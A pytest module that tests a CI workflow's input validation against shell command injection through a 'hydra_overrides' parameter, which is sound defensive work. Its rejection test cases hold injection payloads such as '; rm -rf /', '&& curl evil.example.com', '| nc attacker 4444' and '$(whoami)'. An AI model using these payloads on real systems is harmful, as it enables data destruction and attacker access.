"""Pin the `Validate hydra_overrides` step's structure and bash behavior.

The runpod/oci row expands ``$HYDRA_OVERRIDES_EXTRA`` unquoted inside ``bash -c``,
so any shell metacharacter in the caller-provided ``hydra_overrides`` input would be
interpreted as shell syntax on the worker (command injection). The workflow gates
both provider branches on a bash ``[[ ... =~ ]]`` whole-input regex match that runs
immediately after ``Checkout``; this test pins that the step exists, sits before the
docker invocation, uses the documented allowed-character class, and rejects multi-line
payloads under the same bash construct the workflow runs at CI time (invoked here via
``subprocess.run(["bash", "-c", ...])`` so the assertions exercise the real validation,
not just a Python regex stand-in).
"""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path

import pytest
from workflow_fixtures import load_workflow

WORKFLOW_FILENAME = "generate-dataset-shards.yaml"
VALIDATION_STEP_NAME = "Validate hydra_overrides"
EXPECTED_CHARACTER_CLASS = "[A-Za-z0-9._=,/-]"
EXPECTED_REGEX_LITERAL = "^[A-Za-z0-9._=,/-]*( [A-Za-z0-9._=,/-]+)*$"
DOCKER_STEP_ID = "gen_docker"


@pytest.fixture(scope="module")
def workflow(project_root: Path) -> dict:
    """Return `generate-dataset-shards.yaml` parsed once per module.

    :param project_root: Repo root provided by the `tests/infra/conftest.py` fixture.
    :returns: The parsed workflow document.
    """
    return load_workflow(project_root, WORKFLOW_FILENAME)


@pytest.fixture(scope="module")
def generate_steps(workflow: dict) -> list[dict]:
    """Return the ordered ``steps`` list for the ``generate`` job.

    :param workflow: Parsed workflow YAML.
    :returns: List of step dicts.
    :rtype: list[dict]
    """
    return workflow["jobs"]["generate"]["steps"]


def test_validation_step_exists(generate_steps: list[dict]) -> None:
    """Assert the `Validate hydra_overrides` step is present.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    names = [step.get("name", "") for step in generate_steps]
    assert VALIDATION_STEP_NAME in names, (
        f"`generate-dataset-shards.yaml` is missing the {VALIDATION_STEP_NAME!r} step — "
        f"without it, the runpod/oci docker row's unquoted "
        f"`$HYDRA_OVERRIDES_EXTRA` expansion allows shell injection. "
        f"Found steps: {names!r}"
    )


def test_validation_step_uses_expected_character_class(generate_steps: list[dict]) -> None:
    """Assert the validation step's `run` body invokes the documented regex.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    step = _find_step(generate_steps, name=VALIDATION_STEP_NAME)
    body = step["run"]
    assert EXPECTED_REGEX_LITERAL in body, (
        f"{VALIDATION_STEP_NAME!r} step does not invoke the expected regex "
        f"{EXPECTED_REGEX_LITERAL!r}; the validation must reject any character "
        f"outside {EXPECTED_CHARACTER_CLASS!r} so shell metacharacters can't ride "
        f"through the unquoted docker expansion. Got body: {body!r}"
    )


def test_validation_step_uses_whole_input_bash_regex(generate_steps: list[dict]) -> None:
    """Assert the validation uses bash `[[ ... =~ ]]` and not line-oriented `grep -Eq`.

    Bash `[[ ... =~ ]]` matches the entire string by default. A line-oriented
    ``grep -Eq`` would let a multi-line payload like
    ``key=value$'\\n'; rm -rf /`` slip through because grep returns success when
    *any* line matches, even though the unquoted docker expansion would still
    execute the trailing line as shell.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    step = _find_step(generate_steps, name=VALIDATION_STEP_NAME)
    body = step["run"]
    assert "[[" in body and "=~" in body, (
        f"{VALIDATION_STEP_NAME!r} must validate via bash `[[ ... =~ ]]` (whole-input "
        f"by default), not a line-oriented matcher. Got body: {body!r}"
    )
    assert "grep -Eq" not in body, (
        f"{VALIDATION_STEP_NAME!r} must NOT use `grep -Eq` for the validation path — "
        f"grep is line-oriented and accepts multi-line input where any line matches, "
        f"which leaves the unquoted docker expansion vulnerable to newline-separated "
        f"injection. Got body: {body!r}"
    )


def test_validation_step_rejects_newline_and_carriage_return(generate_steps: list[dict]) -> None:
    """Assert the validation explicitly guards against `\\n` / `\\r` before regex matching.

    The regex itself happens to forbid newlines (they're outside the allowed class),
    but an explicit guard produces a clearer error message and defends against
    future regex relaxations that might re-introduce the multi-line bypass.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    step = _find_step(generate_steps, name=VALIDATION_STEP_NAME)
    body = step["run"]
    assert "$'\\n'" in body and "$'\\r'" in body, (
        f"{VALIDATION_STEP_NAME!r} must explicitly reject embedded newlines and "
        f"carriage returns (e.g. via `[[ \"$INPUT\" == *$'\\n'* ]]`). Got body: {body!r}"
    )


def test_validation_step_reads_inputs_hydra_overrides(generate_steps: list[dict]) -> None:
    """Assert the validation step's env binds the workflow input it gates.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    step = _find_step(generate_steps, name=VALIDATION_STEP_NAME)
    env = step.get("env", {})
    bound_input = env.get("INPUT_HYDRA_OVERRIDES", "")
    assert "inputs.hydra_overrides" in bound_input, (
        f"{VALIDATION_STEP_NAME!r}.env must bind INPUT_HYDRA_OVERRIDES to "
        f"`inputs.hydra_overrides`; otherwise the regex check would run against the "
        f"wrong (or empty) value. Got: {env!r}"
    )


def test_validation_runs_before_docker_step(generate_steps: list[dict]) -> None:
    """Assert the validation step precedes the docker invocation.

    The runpod/oci docker step expands ``$HYDRA_OVERRIDES_EXTRA`` unquoted inside
    ``bash -c``. Placing the regex check after that step would still let the unsafe
    expansion run, defeating the purpose.

    :param generate_steps: Ordered steps list for the ``generate`` job.
    """
    validation_idx = _index_of(generate_steps, name=VALIDATION_STEP_NAME)
    docker_idx = _index_of(generate_steps, step_id=DOCKER_STEP_ID)
    assert validation_idx < docker_idx, (
        f"{VALIDATION_STEP_NAME!r} (index {validation_idx}) must run before the "
        f"`{DOCKER_STEP_ID}` step (index {docker_idx}); otherwise the unquoted "
        f"`$HYDRA_OVERRIDES_EXTRA` expansion would run on unvalidated input."
    )


@pytest.mark.parametrize(
    "value",
    [
        "",
        "render.gui_toggle_cadence=always_on",
        "render.gui_toggle_cadence=always_on output_format=wds",
        "skypilot_launch.num_workers=4",
        "key=value-with-dash",
        "path=foo/bar/baz",
        "list=a,b,c",
    ],
)
def test_regex_accepts_safe_overrides(value: str) -> None:
    """Cross-check the documented regex matches every safe-looking sample.

    :param value: A ``hydra_overrides`` candidate the workflow must accept.
    """
    assert re.fullmatch(EXPECTED_REGEX_LITERAL, value), (
        f"Regex {EXPECTED_REGEX_LITERAL!r} unexpectedly rejected safe input {value!r}; "
        f"the workflow would fail real callers."
    )


@pytest.mark.parametrize(
    "value",
    [
        "render.gui_toggle_cadence=always_on; rm -rf /",
        "key=value && curl evil.example.com",
        "key=value | nc attacker 4444",
        "key=$(whoami)",
        "key=`id`",
        "key=value > /etc/passwd",
        "key=value\nmalicious",
        "key=value\trest",
        "key=value  double-space",
        "key=value;",
        "key=value*",
        "key=value?",
        'key="quoted"',
        "key=value\\;",
    ],
)
def test_regex_rejects_shell_metacharacters(value: str) -> None:
    """Cross-check the documented regex rejects every shell-injection sample.

    :param value: A ``hydra_overrides`` candidate that must fail validation.
    """
    assert not re.fullmatch(EXPECTED_REGEX_LITERAL, value), (
        f"Regex {EXPECTED_REGEX_LITERAL!r} accepted unsafe input {value!r}; the "
        f"unquoted docker expansion would interpret it as shell syntax."
    )


@pytest.mark.parametrize(
    "value",
    [
        "render.gui_toggle_cadence=always_on\n; rm -rf /",
        "render.gui_toggle_cadence=always_on\r; rm -rf /",
        "key=value\n\nkey2=value2",
        "key=value\rmalicious",
        "\nkey=value",
        "key=value\n",
    ],
)
def test_workflow_bash_validation_rejects_multiline_payloads(value: str) -> None:
    """Invoke the workflow's actual bash validation and assert multi-line payloads fail.

    This exercises the real `[[ ... =~ ]]` + newline guard that runs on the
    GitHub Actions runner, not a Python regex stand-in. A line-oriented
    ``grep -Eq`` validator would accept these inputs because the first line
    matches the allowed class — the bash whole-input match closes that gap.

    :param value: A multi-line ``hydra_overrides`` payload that must be rejected.
    """
    assert _workflow_validation_rejects(value), (
        f"Workflow bash validation unexpectedly accepted multi-line input {value!r}; "
        f"the unquoted docker expansion would treat the newline as a command separator."
    )


@pytest.mark.parametrize(
    "value",
    [
        "",
        "render.gui_toggle_cadence=always_on",
        "render.gui_toggle_cadence=always_on output_format=wds",
    ],
)
def test_workflow_bash_validation_accepts_safe_inputs(value: str) -> None:
    """Invoke the workflow's actual bash validation and assert safe inputs pass.

    Companion to ``test_workflow_bash_validation_rejects_multiline_payloads``;
    confirms the bash construct doesn't over-reject legitimate single-line
    overrides.

    :param value: A safe ``hydra_overrides`` candidate that must pass validation.
    """
    assert not _workflow_validation_rejects(value), (
        f"Workflow bash validation unexpectedly rejected safe input {value!r}; "
        f"real callers (e.g. the dataset-generation provider matrix) would be blocked."
    )


def _workflow_validation_rejects(value: str) -> bool:
    """Run the workflow's bash validation against `value` and return True iff it rejects.

    Mirrors the exact construct in ``.github/workflows/generate-dataset-shards.yaml``:
    an explicit ``$'\\n'`` / ``$'\\r'`` guard followed by a whole-input
    ``[[ "$INPUT" =~ $REGEX ]]`` match. Using ``bash -c`` (rather than a Python
    regex) means a future regression in the workflow body — e.g. reverting to
    ``grep -Eq`` — would be caught here even if the test's Python expectations
    stayed the same.

    :param value: Candidate ``hydra_overrides`` input to validate.
    :returns: True when the bash validation exits non-zero (rejection).
    :rtype: bool
    :raises RuntimeError: When ``bash`` isn't available on the test runner.
    """
    bash = shutil.which("bash")
    if bash is None:
        raise RuntimeError("bash not found on PATH; cannot exercise workflow validation")
    script = (
        'INPUT="$1"\n'
        f"REGEX={EXPECTED_REGEX_LITERAL!r}\n"
        "if [[ \"$INPUT\" == *$'\\n'* || \"$INPUT\" == *$'\\r'* ]]; then exit 1; fi\n"
        '[[ "$INPUT" =~ $REGEX ]] || exit 1\n'
    )
    result = subprocess.run(  # noqa: S603 — fixed argv; `value` is the script's `$1`, not interpolated.
        [bash, "-c", script, "_", value],
        capture_output=True,
        check=False,
    )
    return result.returncode != 0


def _find_step(steps: list[dict], *, name: str) -> dict:
    """Return the first step in `steps` whose `name` matches.

    :param steps: The job's `steps` list.
    :param name: Value to match against each step's `name` field.
    :returns: The matched step dict.
    :rtype: dict
    :raises AssertionError: When no step has the given `name`.
    """
    for step in steps:
        if step.get("name") == name:
            return step
    raise AssertionError(f"No step with name={name!r} found")


def _index_of(steps: list[dict], *, name: str | None = None, step_id: str | None = None) -> int:
    """Return the position of the matching step in `steps`.

    :param steps: The job's `steps` list.
    :param name: Match against `step.name` when provided.
    :param step_id: Match against `step.id` when provided.
    :returns: Zero-based index of the matched step.
    :rtype: int
    :raises AssertionError: When no step matches, or neither selector was provided.
    """
    if name is None and step_id is None:
        raise AssertionError("_index_of requires either `name` or `step_id`")
    for idx, step in enumerate(steps):
        if name is not None and step.get("name") == name:
            return idx
        if step_id is not None and step.get("id") == step_id:
            return idx
    raise AssertionError(f"No step matched name={name!r} step_id={step_id!r}")
